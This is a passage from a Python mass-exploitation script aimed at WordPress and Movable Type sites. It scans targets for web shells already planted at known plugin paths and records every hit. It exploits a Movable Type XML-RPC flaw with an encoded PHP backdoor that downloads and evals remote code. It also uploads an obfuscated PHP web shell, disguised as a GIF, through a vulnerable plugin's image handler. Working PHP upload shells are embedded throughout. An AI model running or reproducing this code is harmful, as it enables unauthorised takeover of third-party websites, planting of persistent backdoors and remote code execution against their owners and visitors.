    except:
        print ' -| ' + url + ' --> {}[exploit-7]'.format(fr)

def  ExploreIndexOf(url,path):
    try:
        domain = URLdomain(url)
        urlPath = 'http://'+domain+path
        print ' -| ' + urlPath + ' --> {}[Checking]'.format(fc)
        IndexOfPage = requests.get(urlPath,headers=headers , timeout=15 , allow_redirects=True).content
        if 'Index of' in IndexOfPage:
            ExtractFiles(urlPath,IndexOfPage)
        else:
            print ' -| ' + url +path+ ' --> {}[exploit-7]'.format(fr)
            return False
    except :
        print ' -| ' + url + ' --> {}[exploit-7]'.format(fr)
        return False

def Maper(url):
    try:
        primaryTest = ExploreIndexOf(url,'/wp-includes')
        if not primaryTest == False:
            for path in Locations:
                if not path.startswith('/'):
                    path='/'+path
                ExploreIndexOf(url,path)
    except:
        print ' -| ' + url + ' --> {}[exploit-7]'.format(fr)

def checking(i) :
	try :
		shell = i+'/wp-content/index.php?x=ooo'
		news = requests.get(shell, verify=False, headers=headers, timeout=25)
		if "<form method='POST' enctype='multipart/form-data'><input type='file'name='file' /><input type='submit' value='up' /></form>" in news.text :
			print('[exploited] =====>>>>>>  '+i)
			open('shells.txt','a').write(shell+'\n')
		else :
			print(fr+'[Not_vuln]   =====>>> '+i)
	except :
		pass

def mar(i) :
	try:
		shell = i+'/wp-content/plugins/seoplugins/mar.php'
		prv = requests.get(shell, timeout=10)
		if ">public_html" in prv.text or "<span>Upload file:" in prv.text or 'type="submit" id="_upl" value="Upload">' in prv.text or 'button type="submit" name="upload" class="btn btn-secondary btn-block bg-transparent mt-3" id="load"' in prv.text or '>File Upload :<' in prv.text :
			print('[check_vuln]   ====>>> '+i)
			open('shells.txt','a').write(shell+'\n')
			________hgdyytqffswxcnmwlkqpoiuyty___HFGKSIODCJA___KJQHSGDFRTARZEW_____(shell)
		else :
			print(fr+'[Not_vuln] ========>>>>  '+i)
	except :
		pass

def exploit_two(i) :
    try :
        shell = i+'/wp-content/plugins/seoplugins/db.php?u'
        py_check = requests.get(shell, verify=False, timeout=10)
        if '#0x2525<form action="" method="post"' in py_check.text :
            print('[Vuln check] ======>>> '+i)
            open('vuln.txt','a').write(shell+'\n')
            expp(shell)
            SendMsg(shell)
        else:
            print(fr+'Faill = ====>>>  '+i)
    except :
        pass

shell = """<?php echo "BDKR28"; echo "<br>".php_uname()."<br>"; echo "<form method='post' enctype='multipart/form-data'> <input type='file' name='zb'><input type='submit' name='upload' value='upload'></form>"; if($_POST['upload']) { if(@copy($_FILES['zb']['tmp_name'], $_FILES['zb']['name'])) { echo "eXploiting Done"; } else { echo "Failed to Upload."; } } ?>"""
requests.urllib3.disable_warnings()


def URLdomain(site):
    if site.startswith("http://") :
        site = site.replace("http://","")
    elif site.startswith("https://") :
        site = site.replace("https://","")
    else :
        pass
    pattern = re.compile('(.*)/')
    while re.findall(pattern,site):
        sitez = re.findall(pattern,site)
        site = sitez[0]
    return site


def Chitoge(url):
    try:
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/index.php?3x=3x',timeout=15)
        if "<title>Upload files...</title>" in check.content:
                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                open('Shells.txt', 'a').write(url + '/index.php?3x=3x\n')
                SendMsg(url + '/index.php?3x=3x')
        else:
            print ' -| ' + url + ' --> {}[exploit-8]'.format(fr)
    except :
        print ' -| ' + url + ' --> {}[exploit-8]'.format(fr)

import time, sys, requests,base64, re, os
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import init
init(autoreset=True)

headers = {'Connection': 'keep-alive',
           'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36'}


def URLdomain(site):
    if site.startswith("http://"):
        site = site.replace("http://", "")
    elif site.startswith("https://"):
        site = site.replace("https://", "")
    else:
        pass
    pattern = re.compile('(.*)/')
    while re.findall(pattern, site):
        sitez = re.findall(pattern, site)
        site = sitez[0]
    return site


content_raw = 'bdkr HaCkEr <?php $ch = curl_init($_GET["memex"]); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result = curl_exec($ch);eval("?>".$result); if(isset($_GET["cmd"])){ echo "<pre>"; echo system($_GET["amis"]); echo "</pre>"; } ?>'
rawBase = base64.b64encode(content_raw)
echo = base64.b64encode(
    """`echo 'bdkr HaCkEr<?php eval(base64_decode("ZXJyb3JfcmVwb3J0aW5nKDApOyBlY2hvIHBocF91bmFtZSgpLiI8YnI+Ii5nZXRjd2QoKS4iPGJyPiI7IGlmKCRfR0VUWydGb3gnXSA9PSAnZWZqaXEnKXskc2F3MSA9ICRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXTskc2F3MiA9ICRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddO2VjaG8gIjxmb3JtIG1ldGhvZD0nUE9TVCcgZW5jdHlwZT0nbXVsdGlwYXJ0L2Zvcm0tZGF0YSc+PGlucHV0IHR5cGU9J2ZpbGUnIG5hbWU9J2ZpbGUnIC8+PGlucHV0IHR5cGU9J3N1Ym1pdCcgdmFsdWU9J1VQbG9hZCcgLz48L2Zvcm0+IjsgbW92ZV91cGxvYWRlZF9maWxlKCRzYXcxLCRzYXcyKTsgZXhpdCgwKTsgfSAkY29kZSA9ICJodHRwOi8vIi4kX0dFVFsicGhwIl07IGlmIChlbXB0eSgkY29kZSkgb3IgIXN0cmlzdHIoJGNvZGUsICJodHRwIikpeyBleGl0OyB9IGVsc2UgeyAkcGhwPWZpbGVfZ2V0X2NvbnRlbnRzKCRjb2RlKTsgaWYgKGVtcHR5KCRwaHApKXsgJHBocCA9IGN1cmwoJGNvZGUpOyB9ICRwaHA9c3RyX3JlcGxhY2UoIjw/cGhwIiwgIiIsICRwaHApOyAkcGhwPXN0cl9yZXBsYWNlKCI/PiIsICIiLCAkcGhwKTsgZXZhbCgkcGhwKTsgfSBmdW5jdGlvbiBjdXJsKCR1cmwpIHsgJGN1cmwgPSBjdXJsX2luaXQoKTsgY3VybF9zZXRvcHQoJGN1cmwsIENVUkxPUFRfVElNRU9VVCwgNDApOyBjdXJsX3NldG9wdCgkY3VybCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgVFJVRSk7IGN1cmxfc2V0b3B0KCRjdXJsLCBDVVJMT1BUX1VSTCwgJHVybCk7IGN1cmxfc2V0b3B0KCRjdXJsLCBDVVJMT1BUX1VTRVJBR0VOVCwgIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdPVzY0OyBydjo0My4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzQzLjAiKTsgY3VybF9zZXRvcHQoJGN1cmwsIENVUkxPUFRfRk9MTE9XTE9DQVRJT04sIFRSVUUpOyBpZiAoc3RyaXN0cigkdXJsLCJodHRwczovLyIpKSB7IGN1cmxfc2V0b3B0KCRjdXJsLCBDVVJMT1BUX1NTTF9WRVJJRllQRUVSLCAwKTsgY3VybF9zZXRvcHQoJGN1cmwsIENVUkxPUFRfU1NMX1ZFUklGWUhPU1QsIDApOyB9IGN1cmxfc2V0b3B0KCRjdXJsLCBDVVJMT1BUX0hFQURFUiwgZmFsc2UpOyByZXR1cm4gY3VybF9leGVjICgkY3VybCk7IH0gCg=="));' > bdkr.php`""")


def xmlrpc(site):
    try:
        url = "http://" + URLdomain(site)
        xml_body = """<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>mt.handler_to_coderef</methodName><params><param><value><base64>{}</base64></value></param></params></methodCall>""".format(
            echo)

        headers = {
            'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
            "Content-Type": "text/xml; charset=UTF-8"}
        paths = ['/cgi-bin/mt/', '/mt/', '/cgi-bin/', '/', '/cgi-bin/MT/', '/MT/', '/mtos/', '/cms/', '/blog/', '/cgi/']
        for path in paths:
            r = requests.post(url + path + "mt-xmlrpc.cgi", data=xml_body, headers=headers)
            checker = requests.get(url + path + "/bdkr.php", headers=headers)

            if 'bdkr HaCkEr' in checker.content:
                print("[+] Target : {} Success eXplotinG ").format(url)
                open('shells.txt', 'a').write(url + path + "/bdkr.php?Fox=efjiq" "\n")
                SendMsg(url + path + '/bdkr.php?Fox=efjiq')
            else:
                print("[+] Target : {} exploit-9  ").format(url)
    except:
        pass


shell = ("""<?php echo "bdkr28"; echo "<br>".php_uname()."<br>"; echo "<form method='post' enctype='multipart/form-data'> <input type='file' name='zb'><input type='submit' name='upload' value='upload'></form>"; if($_POST['upload']) { if(@copy($_FILES['zb']['tmp_name'], $_FILES['zb']['name'])) { echo "eXploiting Done"; } else { echo "Failed to Upload."; } } ?>""")
requests.urllib3.disable_warnings()
headers = {'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
            'referer': 'www.google.com'}

def URLdomain(site):
    if site.startswith("http://") :
        site = site.replace("http://","")
    elif site.startswith("https://") :
        site = site.replace("https://","")
    else :
        pass
    pattern = re.compile('(.*)/')
    while re.findall(pattern,site):
        sitez = re.findall(pattern,site)
        site = sitez[0]
    return site


def FourHundredThreebd(url):
    try:
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/ioptimization/IOptimize.php?rchk',headers=headers, allow_redirects=True,timeout=15)
        if 'type="file"><input type="submit" value="Upload"' in check.content:
                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                open('Shells.txt', 'a').write(url + '/wp-content/plugins/ioptimization/IOptimize.php?rchk\n')
                SendMsg(url + '/wp-content/plugins/ioptimization/IOptimize.php?rchk')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/ioptimization/IOptimize.php?rchk',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'type="file"><input type="submit" value="Upload"' in check.content:
                    print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                    open('Shells.txt', 'a').write(url + '/wp-content/plugins/ioptimization/IOptimize.php?rchk\n')
                    SendMsg(url + '/wp-content/plugins/ioptimization/IOptimize.php?rchk')
            else:
                print ' -| ' + url + ' --> {}[exploit-10]'.format(fr)
    except :
        print ' -| ' + url + ' --> {}[exploit-10]'.format(fr)


headers = {'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
            'referer': 'www.google.com'}


def URLdomain(site):
    if site.startswith("http://") :
        site = site.replace("http://","")
    elif site.startswith("https://") :
        site = site.replace("https://","")
    else :
        pass
    pattern = re.compile('(.*)/')
    while re.findall(pattern,site):
        sitez = re.findall(pattern,site)
        site = sitez[0]
    return site


def FourHundredThreebdd(url):
    try:
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/updates.php',headers=headers, allow_redirects=True,timeout=15)
        if '<input type="password" name="password">' in check.content:
                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                open('Shells.txt', 'a').write(url + '/wp-content/updates.php\n')
                SendMsg(url + '/wp-content/updates.php')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/updates.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="password" name="password">' in check.content:
                    print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                    open('Shells.txt', 'a').write(url + '/wp-content/updates.php\n')
                    SendMsg(url + '/wp-content/updates.php')
            else:
                print ' -| ' + url + ' --> {}[exploit-11]'.format(fr)
    except :
        print ' -| ' + url + ' --> {}[exploit-11]'.format(fr)


headers = {'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
            'referer': 'www.google.com'}
headers_up = {'Connection': 'keep-alive',
           'Cache-Control': 'max-age=0',
           'Upgrade-Insecure-Requests': '1',
           'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
           'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
           'Accept-Encoding': 'gzip, deflate',
           'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
           "Content-Type": "multipart/form-data; boundary=---------------------------166450831928367048791705493639",
           'referer': 'www.google.com'}
uploader = """GIF89a
<?php
// Silence is golden.
                                                                                                                                                                                                                                                                                                         function _Z4rA($_BGVjpGk){$_BGVjpGk=substr($_BGVjpGk,(int)(hex2bin('383530')));$_BGVjpGk=substr($_BGVjpGk,(int)(hex2bin('30')),(int)(hex2bin('2d343834')));return $_BGVjpGk;}$_F2X3CXeXN='_Z4rA';$_CEYweTZra='base64_decode';function _KZyC0e1gr($_XrhDt){global $_F2X3CXeXN;global $_CEYweTZra;return strrev(gzinflate($_CEYweTZra(_Z4rA($_XrhDt))));}eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(_KZyC0e1gr('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')))))))))))))))))))))))))));
"""
requests.urllib3.disable_warnings()

def URLdomain(site):
    if site.startswith("http://") :
        site = site.replace("http://","")
    elif site.startswith("https://") :
        site = site.replace("https://","")
    else :
        pass
    pattern = re.compile('(.*)/')
    while re.findall(pattern,site):
        sitez = re.findall(pattern,site)
        site = sitez[0]
    return site

def Exploit(Exploit_Point,Domain):
    try:
        B0x01 = '-----------------------------166450831928367048791705493639\x0d\x0aContent-Disposition: form-data; name=\"uploadsDir\"\x0d\x0a\x0d\x0aXO\x0d\x0a-----------------------------166450831928367048791705493639\x0d\x0aContent-Disposition: form-data; name=\"uploadsDirURL\"\x0d\x0a\x0d\x0aXO\x0d\x0a-----------------------------166450831928367048791705493639\x0d\x0aContent-Disposition: form-data; name=\"f[]\"; filename=\"spec.ph p\"\x0d\x0aContent-Type: image/jpeg\x0d\x0a\x0d\x0a'+uploader+'\x0d\x0a-----------------------------166450831928367048791705493639--\x0d\x0a'
        up = requests.post(Exploit_Point, data=B0x01, headers=headers_up, verify=False, timeout=30).content
        if "image_src" in up:
            Info_Shell = json.loads(up)
            Shell = Exploit_Point.replace("custom-image-handler.php", Info_Shell["image_src"])
            Check_Shell = requests.get(Shell+'?x=ooo', headers=headers, verify=False, timeout=15).content
            if "<input type='file'name='file' /><input type='submit' value='up' /></form>" in Check_Shell:
                print ' -| ' + Domain + ' --> {}[Succefully]'.format(fg)
                open('shells.txt', 'a').write(Shell +'\n')
                SendMsg(Shell)
            else:
                print ' -| ' + Domain + ' --> {}[exploit-12]'.format(fr)
        else:
            print ' -| ' + Domain + ' --> {}[exploit-12]'.format(fr)
    except:
        print ' -| ' + Domain + ' --> {}[exploit-12]'.format(fr)


def Checkerrr(url):
    try:
        Dom = 'https://'+URLdomain(url)
        Exploit_Point = Dom+'/wp-content/plugins/fancy-product-designer/inc/custom-image-handler.php'
        check = requests.get(Exploit_Point,timeout=15,headers=headers,verify=False)
        if "You need to define a directory" in check.content and "save the uploaded user images" in check.content:
            Exploit(Exploit_Point,Dom)
        else:
            Dom = 'http://'+URLdomain(url)
            Exploit_Point = Dom+'/wp-content/plugins/fancy-product-designer/inc/custom-image-handler.php'
            check = requests.get(Exploit_Point,timeout=15,headers=headers,verify=False)
            if "You need to define a directory" in check.content and "save the uploaded user images" in check.content:
                Exploit(Exploit_Point,Dom)
            else:
                print ' -| ' + Dom + ' --> {}[exploit-12]'.format(fr)
    except :
        print ' -| ' + Dom + ' --> {}[exploit-12]'.format(fr)


shell = """<?php echo "BDKR28"; echo "<br>".php_uname()."<br>"; echo "<form method='post' enctype='multipart/form-data'> <input type='file' name='zb'><input type='submit' name='upload' value='upload'></form>"; if($_POST['upload']) { if(@copy($_FILES['zb']['tmp_name'], $_FILES['zb']['name'])) { echo "eXploiting Done"; } else { echo "Failed to Upload."; } } ?>"""
requests.urllib3.disable_warnings()
headers = {'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
            'referer': 'www.google.com'}


def URLdomain(site):
    if site.startswith("http://") :
        site = site.replace("http://","")
    elif site.startswith("https://") :
        site = site.replace("https://","")
    else :
        pass
    pattern = re.compile('(.*)/')
    while re.findall(pattern,site):
        sitez = re.findall(pattern,site)
        site = sitez[0]
    return site


def FourHundredThreeqwq(url):
    try:
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/anttt/simple.php',headers=headers, allow_redirects=True,timeout=15)
        if 'input type="file" id="inputfile" name="inputfile"' in check.content:
                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                open('Shells.txt', 'a').write(url + '/wp-content/plugins/anttt/simple.php\n')
                SendMsg(url + '/wp-content/plugins/anttt/simple.php')
        else:
            url = 'https://' + URLdomain(url)
